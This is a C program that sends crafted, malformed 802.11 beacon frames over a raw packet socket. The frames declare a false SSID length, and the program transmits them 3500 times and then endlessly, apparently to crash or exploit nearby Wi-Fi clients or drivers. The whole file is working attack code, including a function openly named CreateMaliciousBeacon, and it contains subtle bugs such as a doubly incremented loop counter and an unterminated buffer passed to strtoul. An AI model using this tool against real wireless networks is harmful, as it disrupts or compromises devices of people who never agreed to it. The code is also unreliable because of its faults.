#include <stdio.h>
#include <string.h>

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>

#include <time.h>
#include <unistd.h>
#include <assert.h>

#include <sys/socket.h>
#include <sys/ioctl.h>

#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <linux/if_ether.h>
#include <linux/if_packet.h>

uint8_t MBeacon[512];

uint16_t CreateMaliciousBeacon(int radiotap_type, char * addr1, char * addr2, char * addr3, int len);

int main(int argc, char ** argv) {

        if(!argv[1]) {
                printf("Need Device Name\n");
                return -1;
        }

        char * devname = argv[1];

        struct sockaddr_ll ll;
        struct ifreq ifr;

        assert(sizeof(ifr.ifr_name) == IFNAMSIZ);

        int sockfd;
        if((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
                perror("[-] Error Creating Socket");
                return -1;
        }

        memset(&ifr, 0, sizeof(ifr));
        strncpy(ifr.ifr_name, devname, sizeof(ifr.ifr_name));

        if(ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
                perror("[-] ioctl[SIOCGIFINDEX] Failed");
                return -1;
        }

        memset(&ll, 0, sizeof(ll));
        ll.sll_protocol = htons(ETH_P_ALL);
        ll.sll_family = AF_PACKET;
        ll.sll_ifindex = ifr.ifr_ifindex;

        if(bind(sockfd, (struct sockaddr*)&ll, sizeof(ll)) < 0) {
                perror("[-] Error Binding To Interface");
                return -1;
        }

        uint16_t beacon_sz = CreateMaliciousBeacon(8, "FFFFFFFFFFFF", "ABCDEF123456", "123456ABCDEF", 20);

        printf("\033[01;37mDevice: %s\nBeacon Packet: \n\n\033[01;32m\t", argv[1]);
        int b = 0;
        for(int x = 0; x < beacon_sz; ++x) {
                printf("%02X ", MBeacon[x]);
                ++b;
                if(b%16 == 0) printf("\n\t");
        }

        printf("\033[0m\n\n");

        int i = 0;

        for(int i = 0; i < 3500; ++i) {
                send(sockfd, MBeacon, beacon_sz, 0);
                printf("\r[%4.d] Beacon Sent     ", i);
                fflush(stdout);
                ++i;
                usleep(10000);
        }

        beacon_sz = CreateMaliciousBeacon(8, "FFFFFFFFFFFF", "ABCDEF123456", "123456ABCDEF", 50);

        while(1==1) {
                send(sockfd, MBeacon, beacon_sz, 0);
                printf("\r[%4.d] Beacon Sent     ", i);
                fflush(stdout);
                ++i;
                usleep(10000);
        }

        return 0;
}


uint16_t CreateMaliciousBeacon(int radiotap_type, char * addr1, char * addr2, char * addr3, int len) {
        char tmp_buf[2];
        int index = 0;
        int ii;

        MBeacon[index++] = 0x00; MBeacon[index++] = 0x00; MBeacon[index++] = radiotap_type;
        MBeacon[index++] = 0x00; MBeacon[index++] = 0x00; MBeacon[index++] = 0x00; MBeacon[index++] = 0x00;
        MBeacon[index++] = 0x00; MBeacon[index++] = 0x80; MBeacon[index++] = 0x00;
        MBeacon[index++] = 0x00; MBeacon[index++] = 0x00;

        for(int i = 0; i < 6; ++i) {
                memcpy(tmp_buf, addr1+i*2, sizeof(tmp_buf));
                ii = index;
                MBeacon[ii+i] = strtoul(tmp_buf, NULL, 16);
                memset(tmp_buf, '\0', sizeof(tmp_buf));
        }
        index += 6;

        for(int i = 0; i < 6; ++i) {
                memcpy(tmp_buf, addr2+i*2, sizeof(tmp_buf));
                ii = index;
                MBeacon[ii+i] = strtoul(tmp_buf, NULL, 16);
                memset(tmp_buf, '\0', sizeof(tmp_buf));
        }
        index += 6;

        for(int i = 0; i < 6; ++i) {
                memcpy(tmp_buf, addr3+i*2, sizeof(tmp_buf));
                ii = index;
                MBeacon[ii+i] = strtoul(tmp_buf, NULL, 16);
                memset(tmp_buf, '\0', sizeof(tmp_buf));
        }
        index += 6;

        for(int i = 0; i < 10; ++i) {
                ii = index;
                MBeacon[ii+i] = 0x00;
        }
        index += 10;

        MBeacon[index++] = 0x64; MBeacon[index++] = 0x00;
        MBeacon[index++] = 0x11; MBeacon[index++] = 0x00; MBeacon[index++] = 0x00;
        MBeacon[index++] = len;
        MBeacon[index++] = '\x41';

/*              RSN INFO                */
/*
        MBeacon[index++] = 0x01; MBeacon[index++] = 0x00;
        MBeacon[index++] = 0x00; MBeacon[index++] = 0x0F; MBeacon[index++] = 0xAC; MBeacon[index++] = 0x02;
        MBeacon[index++] = 0x02; MBeacon[index++] = 0x00;
        MBeacon[index++] = 0x00; MBeacon[index++] = 0x0F; MBeacon[index++] = 0xAC; MBeacon[index++] = 0x04;
        MBeacon[index++] = 0x00; MBeacon[index++] = 0x0F; MBeacon[index++] = 0XAC; MBeacon[index++] = 0x02;
        MBeacon[index++] = 0x00; MBeacon[index++] = 0x00;
*/
        return index;
}
